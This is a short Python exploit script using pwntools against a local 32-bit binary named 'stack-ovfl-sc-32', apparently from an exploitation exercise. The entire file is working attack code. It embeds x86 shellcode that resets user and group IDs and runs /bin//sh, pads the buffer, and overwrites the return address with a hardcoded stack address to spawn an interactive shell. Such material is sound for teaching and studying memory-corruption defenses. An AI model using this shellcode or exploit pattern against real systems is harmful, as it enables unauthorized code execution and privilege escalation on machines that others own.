#!/usr/bin/env python

from pwn import *

context.terminal = "/bin/bash"

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80'
buf = shellcode + 'A' * (0x88 - 40)

stack_addr = p32(0xffffc490)
c = Core('./core')
#stack_addr = c.stack.find(buf)
#print "Stack_addr: " + stack_addr

buf += stack_addr + stack_addr + stack_addr

p = process('./stack-ovfl-sc-32')
#gdb.attach(p)
p.sendline(buf)
p.interactive()
